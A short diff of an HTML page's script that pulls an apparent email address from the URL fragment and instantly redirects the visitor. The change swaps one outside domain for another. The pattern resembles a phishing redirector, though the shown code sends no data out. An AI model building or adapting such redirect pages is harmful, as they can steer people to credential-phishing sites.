@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://guides.lsaitaly.com/?";
+			window.location.href = "https://efile-devlabsat.devlabsat.com/?";
 		}, 0);
 	</script>
 </html>
